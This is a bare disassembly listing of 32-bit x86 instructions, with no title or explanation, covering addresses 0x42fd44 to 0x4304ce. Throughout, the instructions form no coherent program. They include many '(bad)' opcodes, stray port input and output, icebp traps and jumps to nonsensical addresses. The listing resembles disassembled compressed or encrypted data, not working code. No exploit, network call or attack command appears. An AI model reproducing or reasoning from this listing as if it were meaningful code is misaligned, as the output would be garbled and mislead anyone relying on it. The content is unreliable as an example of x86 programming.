  42fd44:	dec    ebx
  42fd45:	shl    BYTE PTR [eax+0x79614279],cl
  42fd4b:	adc    esi,DWORD PTR [ecx+ecx*2]
  42fd4e:	bound  ecx,QWORD PTR [ebp-0x7d131b76]
  42fd54:	jge    0x42fd77
  42fd56:	jnp    0x42fd31
  42fd58:	test   DWORD PTR [edi],ebx
  42fd5a:	dec    ecx
  42fd5b:	pop    edi
  42fd5c:	sub    BYTE PTR [ebx],0xc3
  42fd5f:	mov    al,ds:0x6d29d9fe
  42fd64:	scas   al,BYTE PTR es:[edi]
  42fd65:	es lahf 
  42fd67:	ds arpl sp,bx
  42fd6a:	add    esp,DWORD PTR [eax+0x16]
  42fd6d:	rcl    DWORD PTR [esi+eiz*8],0x61
  42fd71:	into   
  42fd72:	jmp    0x34328617
  42fd77:	imul   ebp,DWORD PTR [ecx],0x5e07d63e
  42fd7d:	neg    ah
  42fd7f:	mov    cl,0x8d
  42fd81:	sub    bl,BYTE PTR fs:0x8b63606c
  42fd88:	or     ah,bh
  42fd8a:	jp     0x42fdc6
  42fd8c:	sbb    ebp,DWORD PTR [eax+0x7e8886ee]
  42fd92:	pop    esi
  42fd93:	and    al,0xd9
  42fd95:	into   
  42fd96:	icebp  
  42fd97:	mov    al,ds:0xc62a6381
  42fd9c:	or     esi,DWORD PTR [eax-0x55]
  42fd9f:	adc    BYTE PTR [ebx+eiz*2],dh
  42fda2:	inc    ebx
  42fda3:	and    edx,ebp
  42fda5:	xor    al,BYTE PTR [edi]
  42fda7:	mov    esp,0xa101b835
  42fdac:	test   BYTE PTR [ebp+0x6b],0x56
  42fdb0:	jne    0x42fd55
  42fdb2:	lock sbb BYTE PTR [edi*1+0x7c1f0ebc],dh
  42fdba:	out    dx,al
  42fdbb:	push   es
  42fdbc:	(bad)  
  42fdbd:	mov    dl,0xc6
  42fdbf:	inc    ecx
  42fdc0:	jl     0x42fe1f
  42fdc2:	mov    edi,0x1bb4006f
  42fdc7:	and    eax,0xc1e1ae76
  42fdcc:	jbe    0x42fdad
  42fdce:	out    dx,al
  42fdcf:	xchg   edx,eax
  42fdd0:	xor    al,0xd2
  42fdd2:	push   es
  42fdd3:	cmp    edi,DWORD PTR [ebx+eax*1+0x45f9d97a]
  42fdda:	jmp    ebx
  42fddc:	lds    esp,FWORD PTR [eax]
  42fdde:	pushf  
  42fddf:	mov    ds:0xe2b5c15f,eax
  42fde4:	pop    ebp
  42fde5:	popf   
  42fde6:	icebp  
  42fde7:	dec    ebp
  42fde8:	sub    DWORD PTR [ecx+ecx*2],0xb2d282ca
  42fdef:	xchg   edi,eax
  42fdf0:	xchg   esp,eax
  42fdf1:	push   eax
  42fdf2:	or     DWORD PTR [ecx-0x2a9e4701],esp
  42fdf8:	rcl    DWORD PTR [ebp-0x12],cl
  42fdfb:	into   
  42fdfc:	(bad)  
  42fdfd:	xor    BYTE PTR [ebp+0x3eaf0b77],dh
  42fe03:	pop    DWORD PTR ds:0xaaa117dc
  42fe09:	pushf  
  42fe0a:	sbb    ah,BYTE PTR [edx+edx*8+0x1f]
  42fe0e:	out    dx,al
  42fe0f:	sbb    bh,ch
  42fe11:	gs or  al,0x5a
  42fe14:	shr    BYTE PTR [esi+0x76],0xa1
  42fe18:	out    0xdf,eax
  42fe1a:	clc    
  42fe1b:	cmp    ch,BYTE PTR [edi+0x5e2f7742]
  42fe21:	sbb    esi,DWORD PTR [esi+0xbc73845]
  42fe27:	iret   
  42fe28:	inc    esi
  42fe29:	popa   
  42fe2a:	stos   BYTE PTR es:[edi],al
  42fe2b:	popf   
  42fe2c:	jle    0x42fe83
  42fe2e:	jo     0x42fdb0
  42fe30:	dec    edi
  42fe31:	lods   eax,DWORD PTR ds:[esi]
  42fe32:	out    dx,al
  42fe33:	dec    ebx
  42fe34:	aaa    
  42fe35:	pop    ebx
  42fe36:	jmp    0x42fe57
  42fe38:	mov    esp,0xfe7de028
  42fe3d:	popa   
  42fe3e:	leave  
  42fe3f:	mov    ds:0xe036bd13,al
  42fe44:	nop
  42fe45:	mov    ch,0x6e
  42fe47:	push   ss
  42fe48:	ret    
  42fe49:	leave  
  42fe4a:	sub    eax,0xaa5b548b
  42fe4f:	xchg   DWORD PTR [esi],ebx
  42fe51:	mov    eax,0x61bc780a
  42fe56:	dec    ebx
  42fe57:	mov    eax,ds:0xcc6d3983
  42fe5c:	ins    BYTE PTR es:[edi],dx
  42fe5d:	cmp    DWORD PTR [edx-0x43],0xffffffa7
  42fe61:	shr    cl,cl
  42fe63:	mov    al,ds:0xc50c003d
  42fe68:	cmp    BYTE PTR [ecx+0x38],ah
  42fe6b:	xor    eax,0x405a862b
  42fe70:	pushw  0xa2ee
  42fe74:	dec    edi
  42fe75:	pop    ebp
  42fe76:	in     eax,dx
  42fe77:	or     BYTE PTR [edx-0x78],0x7f
  42fe7b:	mov    eax,ds:0xbcfe355f
  42fe80:	imul   edx,DWORD PTR [eax-0x53a103b7],0xffffffb1
  42fe87:	mov    edx,0x1d2e44bc
  42fe8c:	push   ebx
  42fe8d:	pusha  
  42fe8e:	je     0x42fe8f
  42fe90:	test   ebp,esp
  42fe92:	cdq    
  42fe93:	repnz fisub WORD PTR [eax]
  42fe96:	cmp    BYTE PTR [esi*2-0x38081169],ah
  42fe9d:	jae    0x42fe6e
  42fe9f:	mov    esp,0xa0b671d0
  42fea4:	mov    ds:0xe15406b8,eax
  42fea9:	popa   
  42feaa:	pop    ss
  42feab:	ins    BYTE PTR es:[edi],dx
  42feac:	(bad)  
  42fead:	mov    ds:0xc58336ee,eax
  42feb2:	dec    ecx
  42feb3:	out    0xa2,al
  42feb5:	outs   dx,DWORD PTR ds:[esi]
  42feb6:	push   ds
  42feb7:	mov    eax,ds:0x89750230
  42febc:	inc    ecx
  42febd:	test   DWORD PTR [ebp-0x797ee946],edx
  42fec3:	mov    eax,ds:0x9548e157
  42fec8:	imul   ecx,DWORD PTR [ebx+ecx*8],0x69d826a0
  42fecf:	xor    al,0x41
  42fed1:	enter  0xccc4,0x5e
  42fed5:	pusha  
  42fed6:	cmovno esi,ecx
  42fed9:	jnp    0x42ff04
  42fedb:	retf   0x41b6
  42fede:	jge    0x42ff13
  42fee0:	mov    ds:0x9348dfa0,eax
  42fee5:	xchg   DWORD PTR [ebp-0x3f],ecx
  42fee8:	pop    esi
  42fee9:	cwde   
  42feea:	jns    0x42feb9
  42feec:	js     0x42fee4
  42feee:	les    edx,FWORD PTR [esi]
  42fef0:	pop    es
  42fef1:	push   0x575ea4c7
  42fef6:	mov    cl,0x4e
  42fef8:	sbb    dl,BYTE PTR [ecx+0x315e47b4]
  42fefe:	aam    0x6e
  42ff00:	cmp    dl,cl
  42ff02:	add    DWORD PTR [edx-0xc],edx
  42ff05:	jl     0x42ff54
  42ff07:	test   eax,0x2941610f
  42ff0c:	xor    BYTE PTR [esi+edi*4],bh
  42ff0f:	jmp    DWORD PTR [ebx+edx*2-0x3b]
  42ff13:	neg    DWORD PTR [eax+0x6b]
  42ff16:	out    dx,al
  42ff17:	sbb    cl,dl
  42ff19:	inc    esp
  42ff1a:	out    0x4a,al
  42ff1c:	pop    ecx
  42ff1d:	popa   
  42ff1e:	call   0xad1f1b0f
  42ff23:	push   0x74
  42ff25:	inc    ebp
  42ff26:	out    dx,al
  42ff27:	imul   ch
  42ff29:	data16 mov bl,0x19
  42ff2c:	mov    cs,WORD PTR [esi]
  42ff2e:	mov    BYTE PTR [edi-0x5f23d3aa],ch
  42ff34:	inc    DWORD PTR [esi-0x587018be]
  42ff3a:	scas   al,BYTE PTR es:[edi]
  42ff3b:	inc    ebx
  42ff3c:	pop    esi
  42ff3d:	into   
  42ff3e:	mov    eax,ds:0xf8571122
  42ff43:	shr    DWORD PTR [edi-0x5c],0xc2
  42ff47:	js     0x42fed7
  42ff49:	pusha  
  42ff4a:	mov    edi,0x51d4cd4e
  42ff4f:	fdiv   QWORD PTR [eax+0x5313e189]
  42ff55:	jp     0x42feea
  42ff57:	push   ebx
  42ff58:	pop    esi
  42ff59:	jb     0x42ff87
  42ff5b:	dec    bp
  42ff5d:	(bad)  
  42ff5e:	(bad)  
  42ff5f:	fwait
  42ff60:	das    
  42ff61:	fcom   DWORD PTR ds:0x4b885e48
  42ff67:	inc    ebp
  42ff68:	xor    al,0xc7
  42ff6a:	out    0x85,eax
  42ff6c:	ret    
  42ff6d:	pop    esi
  42ff6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff6f:	lea    ebp,[esi]
  42ff71:	ja     0x42fef6
  42ff73:	int3   
  42ff74:	bound  edx,QWORD PTR [esi-0x19]
  42ff77:	ret    
  42ff78:	add    al,BYTE PTR [esp+esi*8+0x325b9f3a]
  42ff7f:	adc    al,0x1f
  42ff81:	loope  0x42ffab
  42ff83:	jmp    0x42ffc3
  42ff85:	push   0xffffffee
  42ff87:	pmaxsw mm3,QWORD PTR [esi+edi*4+0x38]
  42ff8c:	mov    dl,0x75
  42ff8e:	in     eax,dx
  42ff8f:	sahf   
  42ff90:	and    ah,BYTE PTR [ebx-0x26]
  42ff93:	cmp    ebx,0xa1981ba5
  42ff99:	add    BYTE PTR [eax+0x48],bh
  42ff9c:	arpl   di,cx
  42ff9e:	out    dx,al
  42ff9f:	cld    
  42ffa0:	adc    esp,DWORD PTR [esi]
  42ffa2:	pop    ebp
  42ffa3:	pop    ebx
  42ffa4:	inc    esi
  42ffa5:	xlat   BYTE PTR ds:[ebx]
  42ffa6:	fsub   DWORD PTR [eax-0x4af445d2]
  42ffac:	inc    ebx
  42ffad:	mov    esp,DWORD PTR [edx]
  42ffaf:	sahf   
  42ffb0:	adc    BYTE PTR [eax+0x6fab4aee],0x2a
  42ffb7:	xor    DWORD PTR [edi],ebx
  42ffb9:	mov    ?,WORD PTR [ebx-0x5f]
  42ffbc:	addr16 aaa 
  42ffbe:	mov    esp,0x91ff9bb7
  42ffc3:	jmp    0x86813035
  42ffc8:	pop    esi
  42ffc9:	sub    BYTE PTR [ebp-0x3fc81d28],al
  42ffcf:	jmp    0x2532:0xdfe16109
  42ffd6:	mov    edi,0xe745681f
  42ffdb:	adc    bl,BYTE PTR [eax-0x2d]
  42ffde:	jecxz  0x42ff79
  42ffe0:	sbb    BYTE PTR [eax+0x6349c5ee],dl
  42ffe6:	jns    0x42ffce
  42ffe8:	test   DWORD PTR [esi-0x54],ebx
  42ffeb:	dec    edi
  42ffec:	jne    0x42ffe2
  42ffee:	xchg   ebp,eax
  42ffef:	dec    esi
  42fff0:	jmp    DWORD PTR [ecx-0x69d2ea92]
  42fff6:	out    0xb9,eax
  42fff8:	add    al,0xb
  42fffa:	js     0x42ffea
  42fffc:	ds jl  0x42ffc1
  42ffff:	mov    DWORD PTR [ecx+eiz*2],edi
  430002:	or     eax,0x263d5aa4
  430007:	inc    edx
  430008:	mov    dl,0x97
  43000a:	out    dx,al
  43000b:	mov    bh,0xfb
  43000d:	mov    edi,0xa273d83e
  430012:	pop    esp
  430013:	out    dx,al
  430014:	push   esp
  430015:	arpl   WORD PTR [edi],sp
  430017:	cmp    BYTE PTR [esi-0x72],bl
  43001a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43001b:	and    dl,bl
  43001d:	push   edx
  43001e:	popa   
  43001f:	jp     0x43007c
  430021:	cld    
  430022:	popf   
  430023:	mov    edi,0x48ae4d2c
  430028:	dec    eax
  430029:	mov    bh,0xf3
  43002b:	mov    al,ds:0x99d97857
  430030:	pop    ecx
  430031:	sar    DWORD PTR ds:0x6fc65efd,1
  430037:	pop    es
  430038:	in     eax,0x2e
  43003a:	cmp    edx,DWORD PTR [ecx-0x18]
  43003d:	pusha  
  43003e:	inc    eax
  43003f:	call   0x3787fd90
  430044:	cmp    eax,0xd492c2f4
  430049:	pusha  
  43004a:	mov    al,ds:0x3b9c2949
  43004f:	xchg   ecx,eax
  430050:	push   esp
  430051:	popa   
  430052:	lahf   
  430053:	or     DWORD PTR [eax+0x1c],esp
  430056:	cmp    DWORD PTR [ecx-0x58],0xd0d8f0a0
  43005d:	fs (bad) 
  43005f:	loope  0x430007
  430061:	jl     0x4300a3
  430063:	push   0x8cb3524b
  430068:	jno    0x430097
  43006a:	mov    ss,eax
  43006c:	xchg   edx,eax
  43006d:	inc    edx
  43006e:	sar    BYTE PTR [edx+ebx*2],0xfa
  430072:	mov    ecx,0x2edbf9fa
  430077:	xchg   edx,eax
  430078:	enter  0xe6cb,0xa0
  43007c:	out    dx,al
  43007d:	cwde   
  43007e:	jb     0x4300ee
  430080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430081:	xchg   ecx,eax
  430082:	sub    eax,0xaf025e50
  430087:	mov    bh,0xde
  430089:	inc    ecx
  43008a:	stc    
  43008b:	sahf   
  43008c:	add    eax,0xd5f41f61
  430091:	lods   eax,DWORD PTR ds:[esi]
  430092:	test   esp,0x22eeb739
  430098:	pusha  
  430099:	xchg   esp,eax
  43009a:	mov    DWORD PTR [ebx-0x71],esi
  43009d:	int3   
  43009e:	sbb    esp,DWORD PTR [ecx+ebx*2+0x693cfd66]
  4300a5:	sbb    bh,BYTE PTR [esi-0x13]
  4300a8:	xor    DWORD PTR [ebx],edx
  4300aa:	out    dx,al
  4300ab:	daa    
  4300ac:	sti    
  4300ad:	pop    es
  4300ae:	cmp    eax,0xe34d678a
  4300b3:	mov    al,ds:0x9ef2f79
  4300b8:	fst    DWORD PTR [esi-0x43]
  4300bb:	lea    ebx,[esi+0x38]
  4300be:	xchg   edi,eax
  4300bf:	sahf   
  4300c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4300c1:	shl    dh,0x9e
  4300c4:	mov    al,0xae
  4300c6:	fldenv [eax+0x53e8d8c4]
  4300cc:	test   eax,0x5e7102d3
  4300d1:	lds    ebx,FWORD PTR [eax-0x18]
  4300d4:	and    ch,BYTE PTR [edi+0x51931504]
  4300da:	adc    DWORD PTR [ecx],esi
  4300dc:	repz inc ebx
  4300de:	out    0x2a,eax
  4300e0:	jno    0x4300b1
  4300e2:	push   ds
  4300e3:	and    al,0xa6
  4300e5:	inc    eax
  4300e6:	dec    esp
  4300e7:	and    DWORD PTR [esi-0x71],ebx
  4300ea:	bound  edi,QWORD PTR [esi]
  4300ec:	push   esi
  4300ed:	lock cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4300f0:	jmp    DWORD PTR [eax-0x74]
  4300f3:	push   esp
  4300f4:	add    eax,0x15f322cc
  4300f9:	mov    ebx,0x6384ed
  4300fe:	pop    ecx
  4300ff:	(bad)  
  430100:	aad    0x4b
  430102:	shl    DWORD PTR [ebx],cl
  430104:	mov    esp,0x93ee4e20
  430109:	pop    edx
  43010a:	out    dx,al
  43010b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43010c:	test   BYTE PTR [edi],ch
  43010e:	call   0xaca1:0x3aa3821f
  430115:	sbb    DWORD PTR [edi+ebp*4],esp
  430118:	xor    dl,BYTE PTR gs:[eax]
  43011b:	lods   al,BYTE PTR ds:[esi]
  43011c:	inc    edx
  43011d:	rol    BYTE PTR [eax-0x14],1
  430120:	repz mov ah,BYTE PTR fs:[ecx+0x7e]
  430125:	in     eax,dx
  430126:	xchg   edx,eax
  430127:	adc    bh,0x60
  43012a:	mov    bh,0x50
  43012c:	out    dx,eax
  43012d:	cli    
  43012e:	and    al,0x60
  430130:	pop    ss
  430131:	or     eax,0x33d4d3ee
  430136:	je     0x4300c3
  430138:	retf   
  430139:	addr16 mov al,ds:0xf2a1
  43013d:	popa   
  43013e:	cwd    
  430140:	icebp  
  430141:	sub    BYTE PTR [edi-0x79dd9ce9],bl
  430147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430148:	es adc eax,0xde0be0fb
  43014f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430150:	jbe    0x4301b9
  430152:	mov    ah,0x6b
  430154:	xor    BYTE PTR [eax-0x53658433],dl
  43015a:	mov    DWORD PTR ds:0x860b6b5e,edi
  430160:	icebp  
  430161:	scas   al,BYTE PTR es:[edi]
  430162:	pop    ebp
  430163:	jmp    0x606a:0xe51a72cf
  43016a:	jne    0x43014f
  43016c:	xchg   ch,al
  43016e:	jo     0x430148
  430170:	pop    ebp
  430171:	adc    ecx,DWORD PTR [ebp+0x467706e6]
  430177:	mov    eax,0x78d09cfe
  43017c:	mov    ds:0x550e185f,al
  430181:	mov    edi,0x80b0a6c1
  430186:	leave  
  430187:	sbb    BYTE PTR [esi+0x13],0x34
  43018b:	stos   DWORD PTR es:[edi],eax
  43018c:	inc    ecx
  43018d:	fbstp  TBYTE PTR ds:0x15609608
  430193:	(bad)  
  430195:	enter  0xa74c,0xb7
  430199:	ds and bl,bh
  43019c:	xchg   edx,eax
  43019d:	loopne 0x430135
  43019f:	test   esp,0xee828349
  4301a5:	pusha  
  4301a6:	sahf   
  4301a7:	and    DWORD PTR [edx],0xf55965d2
  4301ad:	stos   BYTE PTR es:[edi],al
  4301ae:	out    dx,al
  4301af:	sbb    al,0xb7
  4301b1:	enter  0xce4a,0x20
  4301b5:	xor    dl,BYTE PTR [ecx]
  4301b7:	mov    ds:0xd7b5f1ba,al
  4301bc:	sbb    DWORD PTR [edx+0x4],0xffffff83
  4301c0:	(bad)  
  4301c1:	jns    0x43015e
  4301c3:	adc    BYTE PTR [esi-0x55],bl
  4301c6:	and    DWORD PTR [esi+0x19],0x50
  4301ca:	jae    0x4301cd
  4301cc:	popf   
  4301cd:	pusha  
  4301ce:	dec    edx
  4301cf:	push   esi
  4301d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301d1:	loopne 0x430183
  4301d3:	lahf   
  4301d4:	pop    edi
  4301d5:	cwde   
  4301d6:	(bad)  
  4301d8:	cmp    BYTE PTR [esi-0x19],bh
  4301db:	push   ds
  4301dc:	xchg   ebx,eax
  4301dd:	aad    0x1a
  4301df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301e0:	add    ah,BYTE PTR ds:0xc29b5293
  4301e6:	inc    esi
  4301e7:	ficomp WORD PTR [edi+ebp*1]
  4301ea:	mov    eax,ds:0xef5c7aa1
  4301ef:	cmp    DWORD PTR [edx],ebp
  4301f1:	xor    ah,BYTE PTR [eax]
  4301f3:	jne    0x430253
  4301f5:	daa    
  4301f6:	or     eax,0xf8e6e5e8
  4301fb:	mov    eax,DWORD PTR [edi+0x61]
  4301fe:	cs loop 0x4301fd
  430201:	push   0xffffffa2
  430203:	stos   DWORD PTR es:[edi],eax
  430204:	dec    ebx
  430205:	aam    0x0
  430207:	(bad)
  43020b:	and    al,0xe8
  43020d:	cmp    al,0x78
  43020f:	cmp    al,0xc3
  430211:	pusha  
  430212:	out    0xac,al
  430214:	(bad)  
  430215:	pop    eax
  430216:	lahf   
  430217:	push   edx
  430218:	fld    DWORD PTR [ecx-0x12]
  43021b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43021c:	inc    ebx
  43021d:	iret   
  43021e:	int    0xc4
  430220:	cmp    al,0xe5
  430222:	fwait
  430223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430224:	not    DWORD PTR [esi]
  430226:	jno    0x430232
  430228:	mov    ecx,ebx
  43022a:	jnp    0x43024e
  43022c:	jbe    0x4302a5
  43022e:	popa   
  43022f:	add    DWORD PTR [edi-0x45],ebx
  430232:	mov    cl,0x8e
  430234:	cdq    
  430235:	dec    ecx
  430236:	lods   al,BYTE PTR ds:[esi]
  430237:	pop    eax
  430238:	xchg   edi,eax
  430239:	cmp    eax,0xfbc4ac14
  43023e:	mov    BYTE PTR [esi-0x7df0a278],ah
  430244:	lds    eax,FWORD PTR [eax-0x679fb06a]
  43024a:	out    dx,al
  43024b:	test   BYTE PTR [ecx-0x78ff5f92],ah
  430251:	cmc    
  430252:	dec    edi
  430253:	mov    al,0xd
  430255:	pop    ebx
  430256:	outs   dx,BYTE PTR ds:[esi]
  430257:	fsub   QWORD PTR [ebx]
  430259:	pop    eax
  43025a:	in     al,dx
  43025b:	in     al,0x2b
  43025d:	cmp    BYTE PTR [edx],al
  43025f:	mov    ?,WORD PTR [eax-0x2df991a3]
  430265:	or     eax,0x60b49012
  43026a:	jmp    0x4d70493
  43026f:	jge    0x4302a2
  430271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430272:	in     eax,dx
  430273:	dec    ebp
  430274:	(bad)  
  430275:	mov    dl,BYTE PTR [ebx+0x4ef317e2]
  43027b:	sub    al,0x75
  43027d:	pop    edi
  43027e:	js     0x4302ba
  430280:	and    DWORD PTR [edi-0x2b],ebp
  430283:	lds    esp,FWORD PTR [esi]
  430285:	pushf  
  430286:	ins    DWORD PTR es:[edi],dx
  430287:	dec    ebp
  430288:	push   ebp
  430289:	fucomp st(6)
  43028b:	adc    DWORD PTR [ecx+esi*4+0x12],ebp
  43028f:	xor    ebx,DWORD PTR ds:0x6ac135f
  430295:	ins    BYTE PTR es:[edi],dx
  430296:	outs   dx,BYTE PTR ds:[esi]
  430297:	cmp    eax,0xffb568fe
  43029c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43029d:	ja     0x43028c
  43029f:	mov    edi,0x60c31e05
  4302a4:	rcr    BYTE PTR [eax+0x5f70d63e],0x7f
  4302ab:	pop    ecx
  4302ad:	inc    ecx
  4302ae:	into   
  4302af:	fs cli 
  4302b1:	lea    edx,[esi-0x2d]
  4302b4:	outs   dx,BYTE PTR ds:[esi]
  4302b5:	scas   eax,DWORD PTR es:[edi]
  4302b6:	out    dx,al
  4302b7:	pusha  
  4302b8:	xchg   ebx,eax
  4302b9:	stos   BYTE PTR es:[edi],al
  4302ba:	imul   eax,DWORD PTR [ecx-0x7a],0xaaa199e3
  4302c1:	ret    0x39ea
  4302c4:	cld    
  4302c5:	mov    cl,bl
  4302c7:	xchg   edx,eax
  4302c8:	jmp    0x4302da
  4302ca:	out    dx,al
  4302cb:	mov    al,0x6b
  4302cd:	mov    ds:0xcf64e3ed,al
  4302d2:	out    dx,eax
  4302d3:	lahf   
  4302d4:	inc    edi
  4302d5:	or     eax,0xac3faf83
  4302da:	pop    ebx
  4302db:	mov    gs,WORD PTR [esi+0x54a51f30]
  4302e1:	sub    ecx,edi
  4302e3:	int    0x9e
  4302e5:	push   ds
  4302e6:	pushf  
  4302e7:	push   edi
  4302e8:	push   es
  4302e9:	sbb    BYTE PTR [edi],ah
  4302eb:	call   0x109d:0xfd914def
  4302f2:	adc    edi,DWORD PTR [ecx-0x7c]
  4302f5:	popa   
  4302f6:	(bad)  
  4302f7:	cmp    DWORD PTR [eax+eiz*2],ecx
  4302fa:	mov    dh,al
  4302fc:	out    dx,eax
  4302fd:	add    eax,0xec8eef2d
  430302:	je     0x4302a3
  430304:	jmp    0x430310
  430306:	mov    al,0xf5
  430308:	pop    ebx
  430309:	mov    ch,0x54
  43030b:	xor    DWORD PTR [ebx+0x5e012200],ebx
  430311:	iret   
  430312:	iret   
  430313:	test   DWORD PTR [eax+edx*4+0x60952beb],ebp
  43031a:	add    DWORD PTR [edi+esi*2],eax
  43031d:	mov    eax,0x594b15c2
  430322:	out    dx,al
  430323:	add    DWORD PTR [bx+di+0x3f29],0xa12d7fb1
  43032c:	xor    DWORD PTR [ecx],eax
  43032e:	mov    eax,0xb14cf35c
  430333:	ficomp DWORD PTR [ebx-0x1e]
  430336:	fs push cs
  430338:	inc    ebx
  430339:	mov    esp,0x799f534e
  43033e:	clc    
  43033f:	mov    ds:0x66d6818e,al
  430344:	(bad)  
  430345:	out    dx,eax
  430346:	scas   al,BYTE PTR es:[edi]
  430347:	inc    ebp
  430348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430349:	hlt    
  43034a:	out    dx,al
  43034b:	fnsave [edi]
  43034d:	pop    ebp
  43034e:	mov    bh,0x7b
  430350:	mov    dh,0x8d
  430352:	and    BYTE PTR [ecx+0x242003f8],0x56
  430359:	icebp  
  43035a:	mov    bl,0x2f
  43035c:	pop    esi
  43035d:	mov    ds:0xe5453f8d,al
  430362:	cld    
  430363:	jp     0x430348
  430365:	push   edx
  430366:	mov    edi,0x6b73a446
  43036b:	mov    bh,0x14
  43036d:	pop    eax
  43036e:	ss fcmove st,st(0)
  430371:	int    0xee
  430373:	xor    al,0x32
  430375:	mov    ebx,0x1ba25495
  43037a:	scas   eax,DWORD PTR es:[edi]
  43037b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43037c:	push   es
  43037d:	(bad)  
  43037e:	or     al,0x7e
  430380:	pop    esp
  430381:	loope  0x4303a8
  430383:	mov    DWORD PTR [ebx],ecx
  430385:	adc    eax,0x8ae0c9ee
  43038a:	pop    ebp
  43038b:	cmc    
  43038c:	mov    edi,0xb0a14adc
  430391:	(bad)  
  430392:	or     BYTE PTR [ebx+ebp*1],bh
  430395:	mov    dh,0x76
  430397:	in     eax,0x5e
  430399:	or     BYTE PTR [edx-0xa5a1b9c],ah
  43039f:	fcomi  st,st(7)
  4303a1:	inc    esp
  4303a2:	mov    ecx,0x3e81d642
  4303a7:	mov    eax,ds:0xd3117022
  4303ac:	imul   BYTE PTR [esi-0x12]
  4303af:	lods   al,BYTE PTR ds:[esi]
  4303b0:	mov    DWORD PTR [ebp+eiz*4-0x43],ecx
  4303b4:	cmp    ebx,esp
  4303b6:	shl    DWORD PTR [eax-0x59e712ff],cl
  4303bc:	pavgb  mm1,mm3
  4303bf:	xchg   BYTE PTR [ebx-0x32],dl
  4303c2:	cmp    al,0x40
  4303c4:	lahf   
  4303c5:	fld    DWORD PTR [ebx-0x2e]
  4303c8:	and    bl,BYTE PTR [ecx+0x4388748d]
  4303ce:	fnsave [edx+0x5b]
  4303d1:	ror    ah,cl
  4303d3:	ficomp DWORD PTR [esi]
  4303d5:	repz push ebx
  4303d7:	mov    ebx,0x78e51b9f
  4303dc:	pop    esi
  4303dd:	xchg   esi,eax
  4303de:	rcl    BYTE PTR [esi+0x44],1
  4303e1:	pop    ebx
  4303e2:	push   ds
  4303e3:	int    0xab
  4303e5:	pop    ebp
  4303e6:	push   0x76
  4303e8:	sbb    ch,cl
  4303ea:	(bad)  
  4303eb:	xchg   esp,eax
  4303ec:	fiadd  WORD PTR [esi-0xd]
  4303ef:	dec    eax
  4303f0:	icebp  
  4303f1:	mov    gs,esi
  4303f3:	push   ebp
  4303f4:	jmp    0x9f5a822b
  4303f9:	imul   edi,ebx,0x850ed2a0
  4303ff:	lods   al,BYTE PTR ds:[esi]
  430400:	mov    eax,0x5e1030bd
  430405:	stc    
  430406:	and    bl,BYTE PTR [ecx-0x18c6b71d]
  43040c:	dec    ebp
  43040d:	pop    edx
  43040e:	jl     0x430408
  430410:	cmp    esi,DWORD PTR [ebx-0x19037e5a]
  430416:	es pop esp
  430418:	fs push ebx
  43041a:	or     al,0xfd
  43041c:	ja     0x4303de
  43041e:	pop    ecx
  43041f:	jno    0x43044c
  430421:	sti    
  430422:	push   ds
  430423:	mov    eax,ds:0xd0e002a2
  430428:	mov    ecx,0x5e5ded77
  43042d:	hlt    
  43042e:	stos   DWORD PTR es:[edi],eax
  43042f:	das    
  430430:	or     al,0x4f
  430432:	add    al,0xe1
  430434:	or     DWORD PTR [ecx-0x5f],esp
  430437:	lock stos DWORD PTR es:[edi],eax
  430439:	arpl   WORD PTR [ebx+0x32],bp
  43043c:	or     BYTE PTR [ecx-0x12],bl
  43043f:	mov    DWORD PTR [ebx],0x7a5c5b5
  430445:	mov    ecx,0x8b6aa0ec
  43044a:	nop
  43044b:	test   al,0x93
  43044d:	lods   eax,DWORD PTR ds:[esi]
  43044e:	xor    bh,BYTE PTR [eax+0x12b81a5e]
  430454:	aaa    
  430455:	sub    al,0x10
  430457:	xchg   edi,eax
  430459:	pusha  
  43045a:	retf   
  43045b:	cdq    
  43045c:	sbb    DWORD PTR [ecx-0x707116cd],esi
  430462:	and    dh,BYTE PTR [edi]
  430464:	out    dx,al
  430465:	loopne 0x43044e
  430467:	jnp    0x4304d4
  430469:	adc    al,0x1f
  43046b:	jle    0x43045a
  43046d:	pusha  
  43046e:	cmp    BYTE PTR [esp+ecx*8+0x46f4fda4],cl
  430475:	lods   al,BYTE PTR ds:[esi]
  430476:	out    dx,al
  430477:	inc    eax
  430478:	cmp    ebx,ebp
  43047a:	fs mov edi,0xa0cb7f67
  430480:	ss inc edi
  430482:	lods   al,BYTE PTR ds:[esi]
  430483:	mov    ebx,0x3e9e31bc
  430488:	pop    esi
  430489:	push   0x8f272052
  43048e:	mov    dh,0x37
  430490:	jl     0x4304f2
  430492:	adc    dl,BYTE PTR [ecx]
  430494:	sub    BYTE PTR [eax+0xe],al
  430497:	sbb    BYTE PTR [ecx],ah
  430499:	xchg   esi,eax
  43049a:	out    dx,al
  43049b:	sbb    eax,0x4413a6d4
  4304a0:	fwait
  4304a1:	mul    BYTE PTR [esi]
  4304a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4304a4:	aad    0xcb
  4304a6:	fstp   QWORD PTR [eax+ebx*8-0x25]
  4304aa:	inc    edi
  4304ab:	jno    0x43051d
  4304ad:	les    esp,FWORD PTR [edx+0x7e75e49]
  4304b3:	jp     0x430448
  4304b5:	cmp    eax,0x5e53be21
  4304ba:	add    ah,bh
  4304bc:	in     al,0x1f
  4304be:	push   ecx
  4304bf:	popa   
  4304c0:	fstp   st(1)
  4304c2:	neg    DWORD PTR [eax-0x2]
  4304c5:	in     eax,dx
  4304c6:	out    dx,al
  4304c7:	aam    0x45
  4304c9:	lock and DWORD PTR [ebx],ebp
  4304cc:	and    al,BYTE PTR [eax]
  4304ce:	and    al,0xa1
